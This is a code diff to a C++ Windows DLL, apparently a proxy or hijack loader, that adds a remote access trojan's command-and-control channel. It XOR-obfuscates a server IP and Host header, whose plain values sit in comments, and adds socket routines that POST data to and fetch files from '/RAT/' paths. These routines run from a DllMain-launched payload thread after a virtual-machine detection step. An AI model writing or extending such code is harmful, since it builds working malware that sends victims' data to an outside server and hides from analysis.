@@ -1,6 +1,11 @@
-#include <windows.h>
+#pragma warning(disable: 4222)      // for 'DllInitialize' ordinal
+#define DEBUG 0
+
 #include <process.h>
+#include <ws2tcpip.h>
+#include <mutex>
 #include "vmaware.hpp"
+
 
 #ifndef NT_SUCCESS
     #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -8,7 +13,6 @@
 
 #define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)
 
-#pragma warning(disable: 4222)      // for 'DllInitialize' ordinal
 
 //============================================================================
 
@@ -87,8 +91,30 @@ typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
 
 pfnLoadLibraryA pLoadLibraryA = &LoadLibraryA;
 
+//#define ADDR "103.92.235.21"
+//#define H_NAME "Host: arth.imbeddex.com\r\n"
+#define PRT 80
+std::vector<unsigned char> encrypted_addr = { 0x64, 0x65, 0x66, 0x7b, 0x6c, 0x67, 0x7b, 0x67, 0x66, 0x60, 0x7b, 0x67, 0x64 };
+std::vector<unsigned char> encrypted_host =
+{
+        0xE2, 0xC5, 0xD9, 0xDE, 0x90, 0x8A,                     // "Host: "
+        0xCB, 0xD8, 0xDE, 0xC2, 0x84,                           // "arth."
+        0xC3, 0xC7, 0xC8, 0xCF, 0xCE, 0xCE, 0xCF, 0xD2, 0x84,   // "imbeddex."
+        0xC9, 0xC5, 0xC7,                                       // "com"
+        0xA7, 0xA0                                              // "\r\n"
+};
+
+SOCKET clientSocket = INVALID_SOCKET;
+std::mutex socketMutex;
 
 //============================================================================
+
+std::string static deobfuscate(const std::vector<unsigned char>& data, unsigned char key)
+{
+    std::string result = "";
+    for(unsigned char b : data) result += (char)(b ^ key);
+    return result;
+}
 
 __declspec(noinline) bool static __stdcall isSame(const char* a, const char* b)
 {
@@ -300,6 +326,316 @@ __declspec(noinline) static void* __stdcall ShellcodeFindExportAddress(HMODULE h
 
 //============================================================================
 
+int static socket_setup()
+{
+    std::lock_guard<std::mutex> lock(socketMutex);
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    {
+#if DEBUG
+        std::cerr << "WSAStartup failed.\n";
+#endif
+
+        return 0;
+    }
+
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET)
+    {
+#if DEBUG
+        std::cerr << "Socket creation failed.\n";
+#endif
+
+        WSACleanup();
+        return 0;
+    }
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(PRT);
+    if(inet_pton(AF_INET, deobfuscate(encrypted_addr, 0x55).c_str(), &serverAddr.sin_addr) != 1)
+    {
+#if DEBUG
+        std::cerr << "inet_pton failed to convert address.\n";
+#endif
+        closesocket(clientSocket);
+        WSACleanup();
+        return 0;
+    }
+
+    if(connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    {
+#if DEBUG
+        int error = WSAGetLastError();
+        std::cerr << "Connection failed with error: " << error << std::endl;
+#endif
+
+        closesocket(clientSocket);
+        WSACleanup();
+        return 0;
+    }
+    return 1;
+}
+
+bool static reconnect()
+{
+    if(clientSocket != INVALID_SOCKET) closesocket(clientSocket);
+
+    if(!socket_setup()) return false;
+    else return true;
+}
+
+int send_data(const std::string& filename, const std::string& data)
+{
+    if(clientSocket == INVALID_SOCKET)
+    {
+#if DEBUG
+        std::cerr << "Socket is invalid. Reconnecting..." << std::endl;
+#endif
+        if(!reconnect())
+        {
+#if DEBUG
+            std::cerr << "Reconnection failed." << std::endl;
+#endif
+
+            return 0;
+        }
+    }
+    bool connected = TRUE;
+    std::unique_lock<std::mutex> lock(socketMutex);
+
+    while(connected)
+    {
+        try
+        {
+            std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n" +
+                deobfuscate(encrypted_host, 0xAA) +
+                "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n" +
+                "Content-Type: application/octet-stream\r\n" +
+                "Connection: keep-alive\r\n\r\n" +
+                filename + data;
+            int bytesSent = send(clientSocket, requestString.c_str(), static_cast<int>(requestString.length()), 0);
+            if(bytesSent == SOCKET_ERROR)
+            {
+#if DEBUG
+                int error = WSAGetLastError();
+                std::cerr << "Send failed with error: " << error << std::endl;
+#endif
+
+                connected = false;
+            }
+
+            char buffer[4096];
+            int bytesReceived;
+            std::string response;
+
+            do
+            {
+                bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+                if(bytesReceived > 0)
+                {
+                    buffer[bytesReceived] = '\0';
+                    response += buffer;
+                }
+                else if(bytesReceived == 0)
+                {
+#if DEBUG
+                    std::cout << "Connection closed by server." << std::endl; connected = FALSE;
+#endif
+
+                    lock.unlock();
+                    while(!reconnect())
+                    {
+#if DEBUG
+                        std::cerr << "Reconnection failed. Retrying in 2 seconds..." << std::endl;
+#endif
+
+                        Sleep(2000);
+                    }
+#if DEBUG
+                    std::cerr << "Reconnection successful. Retrying request..." << std::endl;
+#endif
+
+                    connected = TRUE;
+                    lock.lock();
+                    continue;
+                }
+                else
+                {
+#if DEBUG
+                    int error = WSAGetLastError();
+                    std::cerr << "Receive failed with error: " << error << std::endl;
+#endif
+
+                    connected = false;
+                    throw std::runtime_error("Receive failed");
+                }
+            } while(bytesReceived == sizeof(buffer) - 1);
+            break;
+        }
+        catch(const std::exception& e)
+        {
+#if DEBUG
+            std::cerr << "Exception in send_data: " << e.what() << std::endl;
+#else
+            (void)e;
+#endif
+
+            return 0;
+        }
+    }
+    return 1;
+}
+
+std::vector<unsigned char> receive_data_raw(const std::string& filename)
+{
+    std::lock_guard<std::mutex> lock1(socketMutex);
+
+    SOCKET TempSocket = INVALID_SOCKET;
+    try
+    {
+        TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if(TempSocket == INVALID_SOCKET)
+        {
+#if DEBUG
+            std::cerr << "Socket creation failed.\n";
+#endif
+
+            WSACleanup();
+            throw std::runtime_error("Socket creation failed");
+        }
+
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(PRT);
+        if (inet_pton(AF_INET, deobfuscate(encrypted_addr, 0x55).c_str(), &serverAddr.sin_addr) != 1)
+        {
+#if DEBUG
+            std::cerr << "inet_pton failed to convert address.\n";
+#endif
+            closesocket(clientSocket);
+            WSACleanup();
+            return {};
+        }
+
+        while(connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        {
+#if DEBUG
+            int error = WSAGetLastError();
+            if (error != WSAECONNREFUSED) std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
+            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+#endif
+            Sleep(2000);
+        }
+
+        // Send HTTP GET request
+        std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
+        httpRequest += deobfuscate(encrypted_host, 0xAA);
+        httpRequest += "Connection: close\r\n\r\n";
+
+        int bytesSent = send(TempSocket, httpRequest.c_str(), static_cast<int>(httpRequest.length()), 0);
+        if(bytesSent == SOCKET_ERROR)
+        {
+#if DEBUG
+            int error = WSAGetLastError();
+            std::cerr << "Send failed with error (recieve_data_raw): " << error << std::endl;
+#endif
+
+            throw std::runtime_error("Send failed");
+        }
+
+        // Receive data in chunks
+        char buffer[8192];
+        std::vector<unsigned char> receivedData;
+        int bytesReceived;
+
+        do
+        {
+            bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
+            if(bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
+            else if(bytesReceived == 0)
+            {
+#if DEBUG
+                std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
+#endif
+
+                break;
+            }
+            else
+            {
+#if DEBUG
+                int error = WSAGetLastError();
+                std::cerr << "Receive failed with error: " << error << std::endl;
+#endif
+
+                break;
+            }
+        } while(bytesReceived > 0);
+
+        try
+        {
+            // Ensure header separator is found
+            size_t headerEnd = 0;
+            const unsigned char CRLF[] = { 0x0D, 0x0A, 0x0D, 0x0A };
+
+            // Search for header separator (CRLF + CRLF)
+            for(size_t i = 0; i < receivedData.size() - 3; ++i)
+            {
+                if(receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
+                {
+                    headerEnd = i + 4; // Found header, skip the separator
+                    break;
+                }
+            }
+
+            if(headerEnd == 0)
+            {
+#if DEBUG
+                std::cerr << "Header separator not found." << std::endl;
+#endif
+
+                throw std::runtime_error("Header separator not found");
+            }
+
+            if(headerEnd < receivedData.size())
+            {
+                std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
+                return body;
+            }
+            else
+            {
+#if DEBUG
+                std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
+#endif
+
+                throw std::runtime_error("Body extraction failed");
+            }
+        }
+        catch(...)
+        {
+            if(TempSocket != INVALID_SOCKET)
+            {
+                shutdown(TempSocket, SD_BOTH);
+                closesocket(TempSocket);
+                TempSocket = INVALID_SOCKET;
+            }
+            throw;
+        }
+
+    }
+    catch(const std::exception& e)
+    {
+#if DEBUG
+        std::cerr << "Exception in receive_data_raw: " << e.what() << std::endl;
+#else
+        (void)e;
+#endif
+    }
+
+    return std::vector<unsigned char>();
+}
+
+//============================================================================
 
 void static SetupProxies()
 {
@@ -423,7 +759,7 @@ ss << "  [!] Detected: " #flag_name << "\n"
     MessageBoxA(NULL, ss.str().c_str(), "Detection Results", MB_OK | MB_ICONWARNING);
 }
 
-void static checkVM()
+NTSTATUS static checkVM()
 {
 
     uint64_t mask = 0;
@@ -485,8 +821,11 @@ void static checkVM()
     if(VM::check(VM::KGT_SIGNATURE))         mask |= VM_Techniques::KGT_SIGNATURE;
 
     ShowDetectionReport(mask);
+    return STATUS_SUCCESS;
 
 }
+
+//============================================================================
 
 unsigned static __stdcall PayloadThread(void* pArguments)
 {
@@ -512,7 +851,18 @@ unsigned static __stdcall PayloadThread(void* pArguments)
     
     // ----------------------
 
-    checkVM();
+    if(!NT_SUCCESS(checkVM())) return 1;
+
+    // ----------------------
+
+    send_data("MSIMG32_pxy.txt", "Test data again :)");
+    MessageBoxA(NULL, "Sent data", "notif", MB_OK);
+
+    Sleep(1000);
+
+    std::vector<unsigned char> vReceived = receive_data_raw("MSIMG32_pxy.txt");
+    vReceived.push_back(0);
+    MessageBoxA(NULL, reinterpret_cast<const char*>(vReceived.data()), "Got this", MB_OK);
 
     // ----------------------
 
@@ -521,7 +871,7 @@ unsigned static __stdcall PayloadThread(void* pArguments)
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
-    switch (ul_reason_for_call)
+    switch(ul_reason_for_call)
     {
         case DLL_PROCESS_ATTACH:
         {
